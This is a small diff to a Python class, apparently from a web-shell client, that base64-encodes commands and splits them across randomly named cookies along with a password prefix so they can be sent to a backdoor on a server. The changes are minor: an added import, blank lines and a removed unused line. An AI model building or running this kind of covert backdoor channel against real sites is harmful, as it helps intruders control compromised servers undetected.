@@ -17,12 +17,13 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 import random, urllib2, urlparse, re, base64
 from request import Request
-from random import random, choice, shuffle
+from random import random, choice, shuffle, randint
 from string import letters, digits
 
 class CmdRequest(Request):
 
 	def __init__( self, url, password, proxy = None ):
+		
 		Request.__init__( self, url, proxy)
 			
 		self.password  = password
@@ -35,6 +36,7 @@ class CmdRequest(Request):
 		else:
 			self.query = ''.join( self.parsed.path.split('.')[:-1] ).replace( '/', ' ' )
 
+	
 	def setPayload( self, payload, mode):
 		payload = base64.b64encode( payload.strip() )
 		length  = len(payload)
@@ -68,7 +70,6 @@ class CmdRequest(Request):
 			rand_cookie += prefixes.pop() + '=' + payload[third:thirds] + '; '
 			rand_cookie += prefixes.pop() + '=' + payload[thirds:] + ' '
 		
-			cookies = "USR=%s; ASD1=%s; ASD3=%s; ASD4=%s" % (self.password[:2], payload[:third], payload[third:thirds], payload[thirds:])
 			self['Cookie'] = rand_cookie
 		
 		
